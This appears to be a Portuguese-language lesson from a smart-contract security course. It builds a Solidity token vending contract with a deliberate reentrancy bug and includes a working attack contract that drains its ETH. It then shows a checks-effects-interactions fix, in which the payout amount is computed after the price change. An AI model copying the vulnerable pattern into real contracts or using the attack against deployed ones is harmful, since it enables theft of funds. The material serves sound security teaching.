Aqui está a versão expandida para a Aula 6.3 sobre a implementação de uma **Vendor Machine** com um bug de reentrância, incluindo explicações sobre segurança em smartcontracts:

---

# Aula 6.3: Implementação e Segurança de Smartcontracts

## Introdução

Bem-vindos à nossa aula sobre a implementação de smartcontracts com foco em **segurança**, onde vamos construir uma **Vendor Machine** que contém uma vulnerabilidade de **reentrância**. Essa vulnerabilidade será explorada através de um ataque, e posteriormente vamos aprender como corrigir esse problema.

A segurança é um dos aspectos mais críticos no desenvolvimento de contratos inteligentes, pois bugs e vulnerabilidades podem levar à perda de fundos ou ao comportamento inesperado dos contratos. Neste contexto, a reentrância é uma das falhas mais exploradas e será o foco desta aula.

---

## Introdução à Segurança

No desenvolvimento de smartcontracts, erros de segurança podem ter consequências catastróficas. A imutabilidade dos contratos na blockchain significa que, uma vez implantados, eles não podem ser alterados, a menos que já tenham sido projetados para isso. Portanto, é essencial abordar questões de segurança logo no início do processo de desenvolvimento.

### Principais ameaças em contratos inteligentes:

- **Reentrância**: Um ataque onde uma função externa é chamada repetidamente antes que o estado do contrato seja atualizado.
- **Overflow/Underflow de Inteiros**: Problema em que números ultrapassam os limites do tipo de dado e causam comportamentos indesejados.
- **Ataques de frontrunning**: Onde transações são interceptadas e executadas antes de uma transação legítima, geralmente por causa de discrepâncias no tempo de execução.
- **Ataques de controle de acesso**: Quando funções críticas estão abertas para serem chamadas por qualquer usuário, em vez de serem protegidas por modificadores de acesso.

O bug de reentrância foi o causador do famoso hack do **DAO** em 2016, que resultou na perda de milhões de dólares em Ethereum. Hoje, vamos ver como esse tipo de vulnerabilidade funciona e como podemos mitigá-lo.

---

## Implementando uma Vendor Machine

A **Vendor Machine** é um contrato que permite aos usuários comprar e vender tokens ERC-20, simulando uma máquina de vendas automática. O contrato contém funções para:

- Comprar tokens com ETH.
- Vender tokens de volta por ETH.

Contudo, a função `sellTokens` contém uma **vulnerabilidade de reentrância** que exploraremos mais tarde. Aqui está o contrato:

### VENDOR MACHINE

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {Token} from "./Token.sol";
import {UD60x18, ud} from "@prb/math/UD60x18.sol";

contract VendorMachine {
    event TokensPurchased(address buyer, uint256 amountOfETH, uint256 amountOfTokens);
    event Withdraw(address owner, uint256 balance);
    event TokensSold(address seller, uint256 amountOfTokens, uint256 amountOfETH);

    uint256 public constant FACTOR = 943;
    UD60x18 private _price;
    address public owner;
    Token token;

    error VendorMachineNotHaveTokens();
    error VendorMachineNotHaveETH();
    error YouNotHaveEnoughTokens();
    error YouSendWrongValueETH();
    error OneTokenAtATime();
    error WithdrawFailed();
    error Unauthorized();

    modifier onlyOwner() {
        if (msg.sender != owner) {
            revert Unauthorized();
        }
        _;
    }

    constructor(uint256 _initialPrice, address _token) payable {
        _price = ud(_initialPrice);
        token = Token(_token);
        owner = msg.sender;
    }

    function price() public view returns (uint256) {
        return _price.unwrap();
    }

    function buyTokens() external payable returns (bool) {
        UD60x18 msgValue = ud(msg.value);
        UD60x18 tokensToBuy = msgValue.div(_price);
        if (tokensToBuy.unwrap() <= 0) {
            revert YouSendWrongValueETH();
        }
        if (getTokensAvailable() < tokensToBuy.unwrap()) {
            revert VendorMachineNotHaveTokens();
        }

        UD60x18 tokensToTransfer = tokensToBuy.mul(ud(1e18));
        token.transfer(msg.sender, tokensToTransfer.unwrap());

        emit TokensPurchased(msg.sender, msg.value, tokensToTransfer.unwrap());

        _price = _price.add(ud(1 ether));

        return true;
    }

    function sellTokens() external {
        if (token.balanceOf(msg.sender) < 1) {
            revert YouNotHaveEnoughTokens();
        } else if (address(this).balance < _price.unwrap()) {
            revert VendorMachineNotHaveETH();
        } else {
            // Vulnerabilidade de reentrância aqui
            (bool ok, bytes memory data_error) = msg.sender.call{value: _price.unwrap()}("");
            if (!ok) {
                assembly {
                    revert(add(data_error, 32), mload(data_error))
                }
            }

            try token.transferFrom(msg.sender, address(this), 1e18) {
                emit TokensSold(msg.sender, 1e18, _price.unwrap());

                // Ajuste de preço após a venda
                _price = calculateNewPrice();
            } catch (bytes memory transfer_error) {
                assembly {
                    revert(add(transfer_error, 32), mload(transfer_error))
                }
            }
        }
    }

    function withdraw() external onlyOwner {
        uint256 balance = address(this).balance;

        if (balance == 0) {
            revert VendorMachineNotHaveETH();
        }

        (bool ok, bytes memory data) = msg.sender.call{value: balance}("");
        if (!ok) {
            assembly {
                revert(add(data, 32), mload(data))
            }
        }

        emit Withdraw(msg.sender, balance);
    }

    function getTokensAvailable() public view returns (uint256) {
        return token.balanceOf(address(this));
    }

    function calculateNewPrice() internal view returns (UD60x18) {
        return _price.mul(ud(FACTOR)).div(ud(1000));
    }
}
```

### Explicação do Bug de Reentrância

A vulnerabilidade de reentrância ocorre na função `sellTokens`. Ao chamar `msg.sender.call{value: _price.unwrap()}()`, o contrato transfere ETH para o usuário antes de atualizar o estado do contrato (ou seja, antes de completar a transferência dos tokens). Isso permite que um atacante chame novamente a função `sellTokens` dentro do `receive` do contrato atacante, driblando a lógica e vendendo mais tokens do que deveria.

---

## Escrevendo um ataque para a função `sellTokens`

Agora que identificamos a vulnerabilidade, podemos criar um contrato malicioso que a explore. Este contrato repetirá a chamada para a função `sellTokens` na **Vendor Machine** para esvaziar seu saldo de ETH.

### Contrato de Ataque

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {VendorMachine} from "./VendorMachine.sol";
import {Token} from "./Token.sol";

contract ReentrancyAttack {
    VendorMachine public vendorMachine;
    Token public token;

    constructor(address _vendorMachine, address _token) {
        vendorMachine = VendorMachine(_vendorMachine);
        token = Token(_token);
    }

    function run() external payable {
        vendorMachine.buyTokens{value: 10 ether}();  // Compra tokens inicialmente

        token.approve(address(vendorMachine), type(uint256).max);  // Aprova venda de tokens

        vendorMachine.sellTokens();  // Começa o ataque de reentrância
    }

    receive() external payable {
        // Executa o ataque de reentrância, chamando `sellTokens` repetidamente enquanto houver saldo
        if (address(vendorMachine).balance >= vendorMachine.price() && token.balanceOf(address(this)) > 0) {
            vendorMachine.sellTokens();
        }
    }
}
```

### Explicação do Ataque

O contrato **ReentrancyAttack** compra tokens da **Vendor Machine** e, ao vender os tokens, entra em um loop de reentrância através da função `receive()`, chamando repetidamente `sellTokens` antes que o estado do contrato original seja atualizado.

---

## Corrigindo a Vulnerabilidade

A correção para esse tipo de ataque é simples, mas extremamente importante. Precisamos garantir que o estado do contrato seja atualizado **antes** de realizar qualquer transferência de ETH para o usuário. Isso pode ser feito reorganizando a função `sellTokens` para seguir o padrão **"verifique-efeitos-interaja"** (Check-Effects-Interactions).

### Correção

```solidity
function sellTokens() external {
    if (token.balanceOf(msg.sender) < 1) {
        revert YouNotHaveEnoughTokens();
    } else if (address(this).balance < _price.unwrap()) {
        revert VendorMachineNotHaveETH();
    }

    // Atualiza o estado antes de interagir com o contrato externo
    try token.transferFrom(msg.sender, address(this), 1e18) {
        emit TokensSold(msg.sender, 1e18, _price.unwrap());

        // Ajusta o preço antes da interação externa
        _price = calculateNewPrice();
    } catch (bytes memory transfer_error) {
        assembly {
            revert(add(transfer_error, 32), mload(transfer_error))
        }
    }

    // Só depois de atualizar o estado, transferimos o ETH
    (bool ok, bytes memory data_error) = msg.sender.call{value: _price.unwrap()}("");
    if

 (!ok) {
        assembly {
            revert(add(data_error, 32), mload(data_error))
        }
    }
}
```

Agora, o estado do contrato é atualizado antes de transferirmos ETH para o usuário, prevenindo a reentrância.

---

## Encerramento do Curso

Com esta última aula, cobrimos os aspectos críticos do **desenvolvimento seguro de smartcontracts**, desde a introdução à **EVM**, passando pela criação de **tokens ERC-20**, até a identificação e correção de **vulnerabilidades de reentrância** em um contrato prático.

---

## Recapitulação

Nesta aula, abordamos:

- A **implementação de uma Vendor Machine** para compra e venda de tokens ERC-20.
- A introdução à **segurança em contratos inteligentes**, com foco no ataque de reentrância.
- A escrita de um **contrato de ataque** para explorar a vulnerabilidade de reentrância.
- A **correção da vulnerabilidade** aplicando o padrão "verifique-efeitos-interaja".

---

## Lição de Casa

1. Implementar a **Vendor Machine** em um ambiente local.
2. Reproduzir o **ataque de reentrância** para ver como ele funciona na prática.
3. Corrigir a vulnerabilidade de reentrância no contrato e testar novamente.
4. Explorar outras vulnerabilidades comuns, como **overflow** e **underflow**, e pesquisar como preveni-las.

---

## Próxima Aula

Na próxima aula, vamos concluir o curso entendando como integrar o Dev com o Ops.